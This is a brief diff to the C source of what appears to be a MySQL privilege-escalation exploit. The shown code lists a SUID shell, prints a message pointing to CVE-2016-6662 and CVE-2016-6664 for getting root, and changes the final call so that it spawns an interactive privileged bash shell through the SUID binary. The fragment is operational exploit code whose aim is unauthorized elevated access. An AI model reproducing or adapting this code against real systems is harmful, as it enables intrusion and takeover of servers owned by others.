@@ -260,8 +260,8 @@ int main(int argc,char **argv)
     system("ls -l " SUID_SHELL);
 
     printf("\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n");
-    system(SUID_SHELL " -p -i ");
-    //system(SUID_SHELL " -p -c '/bin/bash -i -p'");
+    // system(SUID_SHELL " -p -i ");
+    system(SUID_SHELL " -p -c '/bin/bash -i -p'");
 
     /* close MySQL connection and exit */
     printf("\n[+] Job done. Exiting\n\n");
